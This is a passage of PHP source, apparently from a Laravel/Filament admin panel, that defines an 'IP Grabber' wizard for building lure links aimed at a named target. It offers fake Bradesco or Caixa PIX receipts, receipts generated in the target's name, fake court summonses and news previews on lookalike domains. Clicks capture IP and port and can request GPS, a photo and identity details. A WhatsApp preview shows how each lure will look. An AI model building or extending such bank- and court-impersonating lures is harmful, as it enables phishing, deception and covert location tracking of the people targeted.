<?php

namespace App\Filament\Resources\PixelTracks;

use App\Filament\Resources\PixelTracks\Pages\CreateIpGrabber;
use App\Filament\Resources\PixelTracks\Pages\ListIpGrabbers;
use App\Filament\Resources\PixelTracks\Pages\ViewIpGrabber;
use App\Models\IpGrabber;
use App\Models\IpGrabberFoto;
use App\Services\Pixel\PixCaixaImagemService;
use App\Services\Pixel\PixImagemService;
use Filament\Actions;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\HtmlString;
use Illuminate\Support\Js;
use Filament\Forms;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Schemas\Components\Utilities\Get;
use Filament\Schemas\Components\Utilities\Set;
use Filament\Schemas\Schema;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;

class IpGrabberResource extends Resource
{
    protected static ?string $model = IpGrabber::class;

    protected static ?string $slug = 'ip-grabbers';

    public static function getNavigationIcon(): string|\BackedEnum|null
    {
        return 'heroicon-o-eye';
    }

    public static function getNavigationGroup(): string|\UnitEnum|null
    {
        return 'Rastreamento IP';
    }

    public static function getNavigationLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getNavigationSort(): ?int
    {
        return 60;
    }

    public static function getNavigationBadge(): ?string
    {
        if (! (auth()->user()?->hasActivePixelSubscription() ?? false)) {
            return null;
        }

        $count = static::getEloquentQuery()->whereNull('clicked_at')->count();

        return $count > 0 ? (string) $count : null;
    }

    public static function getNavigationBadgeColor(): ?string
    {
        return 'warning';
    }

    public static function getModelLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getPluralModelLabel(): string
    {
        return 'IP Grabber';
    }

    public static function getPages(): array
    {
        return [
            'index' => ListIpGrabbers::route('/'),
            'create' => CreateIpGrabber::route('/create'),
            'view' => ViewIpGrabber::route('/{record}'),
        ];
    }

    public static function getEloquentQuery(): Builder
    {
        return parent::getEloquentQuery()
            ->with(['criador'])
            ->withCount('fotos')
            ->where('created_by', auth()->id())
            ->where('tracking_channel', 'link')
            ->latest();
    }

    public static function canEdit(Model $record): bool
    {
        return false;
    }

    public static function form(Schema $schema): Schema
    {
        return $schema
            ->columns(1)
            ->components([
                \Filament\Schemas\Components\Wizard::make([
                    \Filament\Schemas\Components\Wizard\Step::make('Identificação')
                        ->description('Informe o contexto de uso deste IP Grabber.')
                        ->icon('heroicon-o-identification')
                        ->components([
                            Forms\Components\Hidden::make('preview_tipo')
                                ->default('pix_bradesco')
                                ->required(),

                            Forms\Components\TextInput::make('label')
                                ->label('Rótulo / Identificação')
                                ->placeholder('Ex: Suspeito João - mensagem enviada em 07/05/2026')
                                ->required()
                                ->maxLength(255)
                                ->columnSpanFull(),
                        ]),

                    \Filament\Schemas\Components\Wizard\Step::make('Captura')
                        ->description('Escolha quais dados serão solicitados ao abrir o link.')
                        ->icon('heroicon-o-finger-print')
                        ->columns([
                            'default' => 1,
                            'md' => 2,
                        ])
                        ->components([
                            Forms\Components\Toggle::make('capture_ip_porta')
                                ->label('Capturar IP e Porta Lógica')
                                ->default(true)
                                ->disabled()
                                ->dehydrated(false)
                                ->helperText('Captura padrão do sistema.')
                                ->columnSpan(1),

                            Forms\Components\Toggle::make('capture_gps')
                                ->label('Solicitar GPS')
                                ->default(false)
                                ->helperText('Depende de autorização explícita do Alvo.')
                                ->columnSpan(1),

                            Forms\Components\Toggle::make('capture_alvo')
                                ->label('Capturar foto')
                                ->default(false)
                                ->helperText('Depende de autorização explícita do Alvo.')
                                ->columnSpan(1),

                            Forms\Components\Toggle::make('capture_identity')
                                ->label('Identidade digital')
                                ->default(false)
                                ->helperText('Tenta coletar nome, e-mail, telefone e contas detectáveis. Depende de autorização explícita do Alvo.')
                                ->columnSpan([
                                    'default' => 1,
                                    'md' => 2,
                                ]),
                        ]),

                    \Filament\Schemas\Components\Wizard\Step::make('Tipo')
                        ->description('Escolha o formato da isca.')
                        ->icon('heroicon-o-squares-2x2')
                        ->components([
                            Forms\Components\Radio::make('tipo_link')
                                ->label('Tipo de link')
                                ->options([
                                    'pix' => 'Comprovante PIX',
                                    'noticia' => 'Notícia externa',
                                    'intimacao' => 'Intimação',
                                    'mensagem' => 'Mensagem customizada',
                                ])
                                ->descriptions([
                                    'pix' => 'Usa um comprovante bancário como preview. Na próxima etapa você escolhe o modelo disponível para esta isca.',
                                    'noticia' => 'Usa título, descrição e imagem de uma URL de notícia e redireciona o clique para ela.',
                                    'intimacao' => 'Mostra um documento oficial e entrega um PDF ou imagem após a captura.',
                                    'mensagem' => 'Permite configurar domínio, título, descrição, imagem e mensagem exibida ao clicar.',
                                ])
                                ->default('pix')
                                ->columns([
                                    'default' => 1,
                                    'md' => 2,
                                ])
                                ->live()
                                ->dehydrated(false)
                                ->afterStateUpdated(function (Set $set, ?string $state): void {
                                    $previewTipo = match ($state) {
                                        'noticia' => 'noticia',
                                        'intimacao' => 'intimacao',
                                        'mensagem' => 'mensagem',
                                        default => 'pix_bradesco',
                                    };

                                    $set('preview_tipo', $previewTipo);

                                    if ($state === 'pix') {
                                        $set('pix_modelo', 'pix_bradesco');
                                    }
                                })
                                ->required()
                                ->columnSpanFull(),

                            Forms\Components\Placeholder::make('tipo_preview')
                                ->hiddenLabel()
                                ->content(fn (Get $get): HtmlString => static::renderTypeGuide($get))
                                ->columnSpanFull(),
                        ]),

                    \Filament\Schemas\Components\Wizard\Step::make('Configuração')
                        ->description('Preencha apenas o necessário para o tipo escolhido.')
                        ->icon('heroicon-o-adjustments-horizontal')
                        ->columns([
                            'default' => 1,
                            'md' => 2,
                        ])
                        ->components([
                            Forms\Components\Radio::make('pix_modelo')
                                ->label('Modelo do comprovante PIX')
                                ->options(static::pixModelCardOptions())
                                ->default('pix_bradesco')
                                ->columns([
                                    'default' => 1,
                                    'md' => 3,
                                ])
                                ->extraAttributes(['class' => 'siard-pix-model-picker'])
                                ->live()
                                ->dehydrated(false)
                                ->visible(fn (Get $get): bool => $get('tipo_link') === 'pix')
                                ->required(fn (Get $get): bool => $get('tipo_link') === 'pix')
                                ->afterStateUpdated(fn (Set $set, ?string $state): mixed => $set('preview_tipo', $state ?: 'pix_bradesco'))
                                ->columnSpanFull(),

                            Forms\Components\Select::make('mensagem')
                                ->label('Mensagem exibida ao clicar')
                                ->options([
                                    'PIX Estornado' => 'PIX Estornado',
                                    IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
                                    'Sistema fora do ar' => 'Sistema fora do ar',
                                    'Redirecionar para página' => 'Redirecionar para página',
                                ])
                                ->default('PIX Estornado')
                                ->selectablePlaceholder(false)
                                ->live()
                                ->required()
                                ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                                ->columnSpanFull(),

                            Forms\Components\TextInput::make('pix_caixa_valor')
                                ->label('Valor do comprovante Caixa')
                                ->placeholder('Ex: 380,00')
                                ->maxLength(20)
                                ->live(debounce: 400)
                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
                                ->helperText('Valor que aparecerá no comprovante.')
                                ->columnSpanFull(),

                            Forms\Components\TextInput::make('nome_alvo')
                                ->label('Nome do alvo')
                                ->placeholder('Ex: João da Silva')
                                ->maxLength(60)
                                ->live(debounce: 400)
                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                                ->helperText('Nome que será escrito automaticamente no comprovante PIX.')
                                ->columnSpanFull(),

                            Forms\Components\TextInput::make('noticia_url')
                                ->label('Link da notícia')
                                ->placeholder('https://site.com/noticia...')
                                ->url()
                                ->maxLength(255)
                                ->live(debounce: 400)
                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                                ->helperText('O sistema usará título, descrição e imagem da notícia no preview.')
                                ->columnSpanFull(),

                            Forms\Components\FileUpload::make('intimacao_arquivo')
                                ->label('Arquivo da intimação')
                                ->helperText('PDF ou documento a ser entregue ao alvo após a captura.')
                                ->disk('public')
                                ->directory('intimacoes')
                                ->visibility('public')
                                ->acceptedFileTypes(['application/pdf', 'image/jpeg', 'image/png'])
                                ->maxSize(10240)
                                ->live()
                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                                ->columnSpanFull(),

                            Forms\Components\Select::make('tracking_domain')
                                ->label('Domínio do link')
                                ->options([
                                    'comprovante-pix.site' => 'comprovante-pix.site',
                                    'comprovante.online' => 'comprovante.online',
                                    'intimacao.online' => 'intimacao.online',
                                    'agenciadanoticia.online' => 'agenciadanoticia.online',
                                ])
                                ->default('comprovante-pix.site')
                                ->selectablePlaceholder(false)
                                ->live()
                                ->required(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                                ->helperText('Domínio usado no link gerado.')
                                ->columnSpanFull(),

                            Forms\Components\TextInput::make('redirect_url')
                                ->label('URL de redirecionamento')
                                ->placeholder('https://site.com/pagina')
                                ->url()
                                ->maxLength(255)
                                ->required(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                                ->visible(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                                ->helperText('Após registrar o acesso, o navegador será direcionado para esta URL.')
                                ->columnSpanFull(),

                            \Filament\Schemas\Components\Section::make('Preview personalizado')
                                ->description('Use apenas para mensagem customizada.')
                                ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                                ->columnSpanFull()
                                ->columns([
                                    'default' => 1,
                                    'md' => 2,
                                ])
                                ->components([
                                    Forms\Components\TextInput::make('og_titulo')
                                        ->label('Título do preview')
                                        ->placeholder('Ex: Documento Policial - Delegacia de Confresa')
                                        ->maxLength(255)
                                        ->live(debounce: 400)
                                        ->columnSpanFull(),

                                    Forms\Components\TextInput::make('og_descricao')
                                        ->label('Descrição do preview')
                                        ->placeholder('Ex: Clique para visualizar o documento.')
                                        ->maxLength(255)
                                        ->live(debounce: 400)
                                        ->columnSpanFull(),

                                    Forms\Components\Toggle::make('preview_usar_upload')
                                        ->label('Usar upload de imagem')
                                        ->default(true)
                                        ->live()
                                        ->afterStateUpdated(function (Set $set, ?bool $state): void {
                                            if ($state) {
                                                $set('preview_usar_url', false);
                                            }
                                        })
                                        ->helperText('A imagem enviada no upload será usada no preview.'),

                                    Forms\Components\Toggle::make('preview_usar_url')
                                        ->label('Usar URL da imagem')
                                        ->default(false)
                                        ->live()
                                        ->afterStateUpdated(function (Set $set, ?bool $state): void {
                                            if ($state) {
                                                $set('preview_usar_upload', false);
                                            }
                                        })
                                        ->helperText('A URL informada será usada como imagem do preview.'),

                                    Forms\Components\FileUpload::make('og_imagem_upload')
                                        ->label('Upload de imagem do preview')
                                        ->helperText('JPEG ou PNG. Usado quando o modo de upload está habilitado.')
                                        ->image()
                                        ->disk('public')
                                        ->directory('pixel-og')
                                        ->visibility('public')
                                        ->imagePreviewHeight('120')
                                        ->maxSize(4096)
                                        ->acceptedFileTypes(['image/jpeg', 'image/png'])
                                        ->live()
                                        ->required(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                                        ->visible(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                                        ->columnSpanFull(),

                                    Forms\Components\TextInput::make('og_imagem')
                                        ->label('URL da imagem do preview')
                                        ->placeholder('https://seudominio.com/imagens/preview.jpg')
                                        ->url()
                                        ->live(debounce: 400)
                                        ->required(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                                        ->visible(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                                        ->helperText('Tamanho ideal: 1200x630px.')
                                        ->columnSpanFull(),
                                ]),
                        ]),

                    \Filament\Schemas\Components\Wizard\Step::make('Revisão')
                        ->description('Confira como o link deve aparecer antes de gerar.')
                        ->icon('heroicon-o-eye')
                        ->columns([
                            'default' => 1,
                            'xl' => 3,
                        ])
                        ->components([
                            Forms\Components\Placeholder::make('resumo')
                                ->hiddenLabel()
                                ->content(fn (Get $get): HtmlString => static::renderReviewSummary($get))
                                ->columnSpan([
                                    'default' => 1,
                                    'xl' => 1,
                                ]),

                            \Filament\Schemas\Components\Section::make('Preview no WhatsApp')
                                ->description('Simula visualmente como o link tende a aparecer no WhatsApp.')
                                ->components([
                                    Forms\Components\Placeholder::make('whatsapp_preview')
                                        ->hiddenLabel()
                                        ->content(fn (Get $get): HtmlString => static::renderWhatsappPreview($get))
                                        ->columnSpanFull(),
                                ])
                                ->columnSpan([
                                    'default' => 1,
                                    'xl' => 2,
                                ]),
                        ]),
                ])
                    ->columnSpanFull()
                    ->nextAction(fn (Actions\Action $action): Actions\Action => $action->label('Próximo'))
                    ->previousAction(fn (Actions\Action $action): Actions\Action => $action->label('Voltar'))
                    ->submitAction(static::renderWizardSubmitAction()),
            ]);
    }

    private static function renderWizardSubmitAction(): HtmlString
    {
        return new HtmlString(
            '<button type="submit" class="fi-btn fi-color-primary fi-btn-color-primary fi-size-md" style="background:#2563eb;border-color:#2563eb;color:#ffffff;" wire:loading.attr="disabled">'
                . '<span class="fi-btn-label">Gerar isca</span>'
            . '</button>'
        );
    }

    private static function renderTypeGuide(Get $get): HtmlString
    {
        $type = (string) ($get('tipo_link') ?: 'pix');

        [$title, $description, $accent] = match ($type) {
            'noticia' => ['Notícia externa', 'Cole uma URL de notícia. O sistema tenta carregar título, descrição e imagem para o preview.', '#0ea5e9'],
            'intimacao' => ['Intimação', 'Envie um PDF ou imagem. O clique registra a captura e entrega o arquivo ao alvo.', '#6366f1'],
            'mensagem' => ['Mensagem customizada', 'Configure manualmente domínio, título, descrição, imagem e mensagem de clique.', '#f59e0b'],
            default => ['Comprovante PIX', 'Escolha um modelo PIX na próxima etapa. O preview será atualizado conforme o valor ou nome informado.', '#22c55e'],
        };

        return new HtmlString(
            '<div style="border:1px solid rgba(148,163,184,.25);border-left:4px solid ' . e($accent) . ';border-radius:10px;padding:14px 16px;background:rgba(15,23,42,.03);">'
                . '<div style="font-weight:700;color:#0f172a;margin-bottom:4px;">' . e($title) . '</div>'
                . '<div style="color:#64748b;font-size:13px;line-height:1.5;">' . e($description) . '</div>'
            . '</div>'
        );
    }

    /**
     * @return array<string, HtmlString>
     */
    private static function pixModelCardOptions(): array
    {
        return [
            'pix_bradesco' => static::pixModelCardLabel(
                'Bradesco',
                'Comprovante pronto',
                'comprovante-pix.site',
                static::resolveStoragePreviewAssetUrl('pixel-og/templates/pix-bradesco.png')
            ),
            'pix_caixa' => static::pixModelCardLabel(
                'Caixa',
                'Informe o valor',
                'comprovante.online',
                static::resolvePublicPreviewAssetUrl('images/comprovante-pix-caixa.png')
            ),
            'pix_nome_alvo' => static::pixModelCardLabel(
                'Em nome do alvo',
                'Informe o nome do alvo',
                'comprovante.online',
                static::resolvePublicPreviewAssetUrl('images/pix-img-gerar.png')
            ),
        ];
    }

    private static function pixModelCardLabel(string $title, string $description, string $domain, ?string $imageUrl): HtmlString
    {
        $image = $imageUrl
            ? '<img class="siard-pix-model-card-image" src="' . e($imageUrl) . '" alt="' . e($title) . '">'
            : '<span class="siard-pix-model-card-image siard-pix-model-card-image-empty">Preview</span>';

        return new HtmlString(
            '<span class="siard-pix-model-card">'
                . '<span class="siard-pix-model-card-media">' . $image . '</span>'
                . '<span class="siard-pix-model-card-title">' . e($title) . '</span>'
                . '<span class="siard-pix-model-card-description">' . e($description) . '</span>'
                . '<span class="siard-pix-model-card-domain">' . e($domain) . '</span>'
            . '</span>'
        );
    }

    private static function renderReviewSummary(Get $get): HtmlString
    {
        $previewType = (string) ($get('preview_tipo') ?: 'pix_bradesco');
        $typeLabel = match ($previewType) {
            'noticia' => 'Notícia externa',
            'pix_bradesco' => 'PIX Bradesco',
            'pix_caixa' => 'PIX Caixa',
            'pix_nome_alvo' => 'PIX em nome do alvo',
            'intimacao' => 'Intimação',
            default => 'Mensagem customizada',
        };

        $captures = collect([
            $get('capture_gps') ? 'GPS' : null,
            $get('capture_alvo') ? 'Foto' : null,
            $get('capture_identity') ? 'Identidade digital' : null,
        ])->filter()->implode(', ') ?: 'Nenhuma captura opcional';

        $preview = static::resolveWhatsappPreviewData($get);

        return new HtmlString(
            '<div style="border:1px solid rgba(148,163,184,.25);border-radius:12px;padding:16px;background:#fff;">'
                . '<div style="font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#64748b;margin-bottom:12px;">Resumo</div>'
                . '<dl style="display:grid;gap:10px;margin:0;">'
                    . static::reviewRow('Tipo', $typeLabel)
                    . static::reviewRow('Domínio', mb_strtolower($preview['domain']))
                    . static::reviewRow('Mensagem', $preview['message'])
                    . static::reviewRow('Capturas', $captures)
                . '</dl>'
            . '</div>'
        );
    }

    private static function reviewRow(string $label, string $value): string
    {
        return '<div>'
            . '<dt style="font-size:11px;font-weight:700;text-transform:uppercase;color:#94a3b8;margin-bottom:2px;">' . e($label) . '</dt>'
            . '<dd style="margin:0;color:#0f172a;font-size:14px;font-weight:600;line-height:1.4;word-break:break-word;">' . e($value) . '</dd>'
        . '</div>';
    }

    private static function renderWhatsappPreview(Get $get): HtmlString
    {
        $preview = static::resolveWhatsappPreviewData($get);
        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
        $previewMessage = $preview['message'];
        $imageStyle = match ($previewType) {
            'pix_bradesco' => 'display:block;width:100%;height:192px;object-fit:cover;object-position:center;background:#ffffff;',
            'pix_caixa', 'pix_nome_alvo' => 'display:block;width:100%;height:192px;object-fit:contain;object-position:center;background:#ffffff;padding:8px 6px;',
            default => 'display:block;width:100%;height:192px;object-fit:cover;',
        };

        $imageBlock = $preview['imageUrl']
            ? '<img src="' . e($preview['imageUrl']) . '" alt="Preview do link" style="' . $imageStyle . '">'
            : '<div style="display:flex;align-items:center;justify-content:center;width:100%;height:192px;background:linear-gradient(135deg,#d1fae5 0%,#dcfce7 45%,#f0fdf4 100%);color:#166534;font-size:0.9rem;font-weight:600;">WhatsApp</div>';

        return new HtmlString(
            '<div style="width:100%;max-width:560px;box-sizing:border-box;border-radius:16px;background:#efeae2;padding:16px 14px;font-family:Segoe UI,Helvetica,Arial,sans-serif;">'
                . '<div style="display:flex;justify-content:flex-end;width:100%;">'
                    . '<div style="width:100%;max-width:420px;box-sizing:border-box;border-radius:10px 10px 4px 10px;background:#d9fdd3;padding:10px 10px 8px;box-shadow:0 1px 1px rgba(0,0,0,.08);">'
                        . '<div style="margin-bottom:8px;color:#111b21;font-size:13px;line-height:1.45;">' . e($previewMessage) . '</div>'
                        . '<div style="overflow:hidden;border-radius:8px;background:#fff;border:1px solid #d1d7db;">'
                            . $imageBlock
                            . '<div style="padding:10px 12px 11px;">'
                                . '<div style="margin-bottom:5px;color:#111b21;font-size:15px;font-weight:600;line-height:1.32;">' . e($preview['title']) . '</div>'
                                . '<div style="margin-bottom:4px;color:#667781;font-size:12px;line-height:1.4;">' . e($preview['description']) . '</div>'
                                . '<div style="color:#667781;font-size:10px;font-weight:600;letter-spacing:.02em;text-transform:none;">' . e(mb_strtolower($preview['domain'])) . '</div>'
                            . '</div>'
                        . '</div>'
                        . '<div style="margin-top:6px;text-align:right;color:#667781;font-size:10px;">agora</div>'
                    . '</div>'
                . '</div>'
            . '</div>'
        );
    }

    /**
     * @return array{title:string,description:string,message:string,domain:string,imageUrl:?string}
     */
    private static function resolveWhatsappPreviewData(Get $get): array
    {
        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
        $title = trim((string) ($get('og_titulo') ?: ''));
        $description = trim((string) ($get('og_descricao') ?: ''));
        $message = in_array($previewType, ['noticia', 'intimacao'], true)
            ? ''
            : trim((string) ($get('mensagem') ?: ''));
        $domain = static::resolvePreviewDomain($get);
        $newsMetadata = static::resolveNewsPreviewMetadata($get);

        [$fallbackTitle, $fallbackDescription, $fallbackMessage, $fallbackDomain] = match ($previewType) {
            'noticia' => [
                'Prévia da notícia',
                trim((string) ($get('noticia_url') ?: 'Clique para abrir a notícia compartilhada.')),
                'Notícia externa',
                'agenciadanoticia.online',
            ],
            'pix_bradesco' => [
                'Comprovante PIX Bradesco',
                'Confirme sua chave pix clicando aqui.',
                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
                'comprovante-pix.site',
            ],
            'pix_caixa' => [
                'Comprovante PIX Caixa',
                'Clique para abrir seu comprovante.',
                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
                'comprovante.online',
            ],
            'pix_nome_alvo' => [
                'Comprovante PIX',
                'Clique para abrir seu comprovante.',
                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
                'comprovante.online',
            ],
            'intimacao' => [
                'Intimação.pdf',
                'Clique para visualizar e baixar o documento oficial.',
                'Intimação',
                'intimacao.online',
            ],
            default => [
                'Título do preview',
                'A descrição do link aparecerá aqui no momento do compartilhamento.',
                'PIX Estornado',
                'comprovante-pix.site',
            ],
        };

        if ($previewType === 'noticia') {
            $fallbackTitle = (string) ($newsMetadata['og_titulo'] ?? $fallbackTitle);
            $fallbackDescription = (string) ($newsMetadata['og_descricao'] ?? $fallbackDescription);
        }

        return [
            'title' => $title !== '' ? $title : $fallbackTitle,
            'description' => $description !== '' ? $description : $fallbackDescription,
            'message' => $message !== '' ? $message : $fallbackMessage,
            'domain' => $domain !== '' ? $domain : $fallbackDomain,
            'imageUrl' => static::resolveWhatsappPreviewImageUrl($get, $newsMetadata),
        ];
    }

    private static function resolveWhatsappPreviewImageUrl(Get $get, array $newsMetadata = []): ?string
    {
        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
        $uploadPath = trim((string) ($get('og_imagem_upload') ?: ''));

        if ($uploadPath !== '') {
            return static::resolveStoragePreviewAssetUrl($uploadPath);
        }

        $imageUrl = trim((string) ($get('og_imagem') ?: ''));

        if ($imageUrl !== '') {
            return $imageUrl;
        }

        if ($previewType === 'noticia' && filled($newsMetadata['og_imagem'] ?? null)) {
            return (string) $newsMetadata['og_imagem'];
        }

        if ($previewType === 'intimacao') {
            $intimacaoArquivo = trim((string) ($get('intimacao_arquivo') ?: ''));

            if ($intimacaoArquivo !== '' && preg_match('/\.(png|jpe?g|webp)$/i', $intimacaoArquivo)) {
                return static::resolveStoragePreviewAssetUrl($intimacaoArquivo);
            }
        }

        if ($previewType === 'pix_nome_alvo') {
            $nomeAlvo = trim((string) ($get('nome_alvo') ?: ''));

            if ($nomeAlvo !== '') {
                try {
                    return app(PixImagemService::class)->gerarDataUri($nomeAlvo);
                } catch (\Throwable) {
                    return static::resolvePublicPreviewAssetUrl('images/pix-img-gerar.png');
                }
            }
        }

        if ($previewType === 'pix_caixa') {
            $valor = trim((string) ($get('pix_caixa_valor') ?: ''));

            if ($valor !== '') {
                try {
                    return app(PixCaixaImagemService::class)->gerarDataUri($valor);
                } catch (\Throwable) {
                    return static::resolvePublicPreviewAssetUrl('images/comprovante-pix-caixa.png');
                }
            }
        }

        return match ($previewType) {
            'pix_bradesco' => static::resolveStoragePreviewAssetUrl('pixel-og/templates/pix-bradesco.png'),
            'pix_caixa' => static::resolvePublicPreviewAssetUrl('images/comprovante-pix-caixa.png'),
            'pix_nome_alvo' => static::resolvePublicPreviewAssetUrl('images/pix-img-gerar.png'),
            default => null,
        };
    }

    private static function resolvePreviewDomain(Get $get): string
    {
        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
        $trackingDomain = trim((string) ($get('tracking_domain') ?: ''));

        return match ($previewType) {
            'pix_bradesco' => 'comprovante-pix.site',
            'pix_caixa', 'pix_nome_alvo' => 'comprovante.online',
            'intimacao' => 'intimacao.online',
            'noticia' => 'agenciadanoticia.online',
            default => $trackingDomain,
        };
    }

    private static function resolveNewsPreviewMetadata(Get $get): array
    {
        if ((string) ($get('preview_tipo') ?: '') !== 'noticia') {
            return [];
        }

        $newsUrl = trim((string) ($get('noticia_url') ?: ''));

        if ($newsUrl === '') {
            return [];
        }

        try {
            return app(\App\Services\Pixel\NewsPreviewMetadataService::class)->fetch($newsUrl);
        } catch (\Throwable) {
            return [];
        }
    }

    private static function resolveStoragePreviewAssetUrl(string $relativePath): ?string
    {
        $normalizedPath = ltrim(str_replace('\\', '/', $relativePath), '/');

        if (Storage::disk('public')->exists($normalizedPath)) {
            $publicStoragePath = public_path('storage/' . $normalizedPath);

            if (file_exists($publicStoragePath)) {
                return url('/storage/' . $normalizedPath);
            }

            $contents = Storage::disk('public')->get($normalizedPath);
            $mimeType = Storage::disk('public')->mimeType($normalizedPath) ?: 'image/png';

            return 'data:' . $mimeType . ';base64,' . base64_encode($contents);
        }

        return null;
    }

    private static function resolvePublicPreviewAssetUrl(string $relativePath): ?string
    {
        $normalizedPath = ltrim(str_replace('\\', '/', $relativePath), '/');
        $fullPath = public_path($normalizedPath);

        if (! file_exists($fullPath)) {
            return null;
        }

        return url('/' . $normalizedPath);
    }

    private static function buildCopyUrlHandler(string $url): string
    {
        $url = Js::from($url);

        return <<<JS
            const text = {$url};
            const notify = (title, status = 'success') => {
                if (window.FilamentNotification) {
                    window.FilamentNotification
                        .notification()
                        .title(title)
                        .status(status)
                        .send();

                    return;
                }

                const existingToast = document.getElementById('siard-copy-toast');

                if (existingToast) {
                    existingToast.remove();
                }

                const toast = document.createElement('div');
                toast.id = 'siard-copy-toast';
                toast.textContent = title;
                toast.setAttribute('role', 'status');
                toast.style.position = 'fixed';
                toast.style.right = '20px';
                toast.style.bottom = '20px';
                toast.style.zIndex = '99999';
                toast.style.borderRadius = '12px';
                toast.style.background = status === 'success' ? '#16a34a' : '#dc2626';
                toast.style.color = '#ffffff';
                toast.style.fontSize = '14px';
                toast.style.fontWeight = '700';
                toast.style.padding = '12px 16px';
                toast.style.boxShadow = '0 14px 34px rgba(15, 23, 42, 0.22)';
                toast.style.opacity = '0';
                toast.style.transform = 'translateY(8px)';
                toast.style.transition = 'opacity 160ms ease, transform 160ms ease';

                document.body.appendChild(toast);

                requestAnimationFrame(() => {
                    toast.style.opacity = '1';
                    toast.style.transform = 'translateY(0)';
                });

                setTimeout(() => {
                    toast.style.opacity = '0';
                    toast.style.transform = 'translateY(8px)';

                    setTimeout(() => toast.remove(), 180);
                }, 2200);
            };

            const promptFallback = () => {
                window.prompt('Não foi possível copiar automaticamente. Copie a URL abaixo:', text);
            };

            const legacyCopy = () => {
                const input = document.createElement('input');
                input.value = text;
                input.type = 'text';
                input.setAttribute('readonly', '');
                input.style.position = 'fixed';
                input.style.top = '16px';
                input.style.left = '16px';
                input.style.opacity = '0.01';
                input.style.zIndex = '-1';
                document.body.appendChild(input);
                input.focus();
                input.select();
                input.setSelectionRange(0, input.value.length);

                let copied = false;

                try {
                    copied = document.execCommand('copy');
                } catch (error) {
                    copied = false;
                } finally {
                    document.body.removeChild(input);
                }

                if (copied) {
                    notify('Link copiado');
                } else {
                    promptFallback();
                }
            };

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard
                    .writeText(text)
                    .then(() => notify('Link copiado'))
                    .catch(() => legacyCopy());
            } else {
                legacyCopy();
            }
        JS;
    }

    public static function table(Table $table): Table
    {
        return $table
            ->recordUrl(fn (IpGrabber $record): string => static::getUrl('view', ['record' => $record]))
            ->columns([
                Tables\Columns\TextColumn::make('label')
                    ->label('Identificação')
                    ->searchable()
                    ->sortable()
                    ->wrap()
                    ->weight('bold'),
                Tables\Columns\TextColumn::make('copiar_url')
                    ->label('Copiar URL')
                    ->state('Copiar')
                    ->badge()
                    ->color('gray')
                    ->alignCenter()
                    ->copyable()
                    ->copyMessage('Link copiado')
                    ->copyMessageDuration(2500)
                    ->copyableState(fn (IpGrabber $record): string => $record->trackingUrl())
                    ->extraAttributes(['class' => 'cursor-pointer']),
                Tables\Columns\TextColumn::make('pixel_url')
                    ->label('URL do link')
                    ->state(fn (IpGrabber $record) => $record->trackingUrl())
                    ->copyable()
                    ->copyMessage('URL copiada!')
                    ->copyableState(fn (IpGrabber $record) => $record->trackingUrl())
                    ->wrap(),
                Tables\Columns\TextColumn::make('status')
                    ->label('Status')
                    ->badge()
                    ->state(fn (IpGrabber $record) => $record->clicked_at ? 'Capturado' : 'Aguardando')
                    ->color(fn (IpGrabber $record) => $record->clicked_at ? 'success' : 'warning'),
                Tables\Columns\TextColumn::make('total_acessos')
                    ->label('Acessos')
                    ->alignCenter()
                    ->sortable(),
                Tables\Columns\TextColumn::make('ip')->label('IP Público')->copyable()->searchable()->placeholder('—'),
                Tables\Columns\TextColumn::make('porta')->label('Porta')->alignCenter()->placeholder('—'),
                Tables\Columns\TextColumn::make('gmt')
                    ->label('GMT')
                    ->formatStateUsing(fn (?string $state): string => $state ? trim(explode(' ', $state)[0]) : '—')
                    ->placeholder('—'),
                Tables\Columns\TextColumn::make('clicked_at')
                    ->label('Hora do Acesso')
                    ->dateTime('d/m/Y H:i:s')
                    ->timezone('America/Sao_Paulo')
                    ->placeholder('—')
                    ->sortable(),
                Tables\Columns\TextColumn::make('created_at')
                    ->label('Criado em')
                    ->dateTime('d/m/Y H:i')
                    ->timezone('America/Sao_Paulo')
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
            ])
            ->filters([
                Tables\Filters\SelectFilter::make('status')
                    ->label('Status')
                    ->options(['capturado' => 'Capturado', 'aguardando' => 'Aguardando'])
                    ->query(fn (Builder $query, array $data) => match ($data['value'] ?? null) {
                        'capturado' => $query->whereNotNull('clicked_at'),
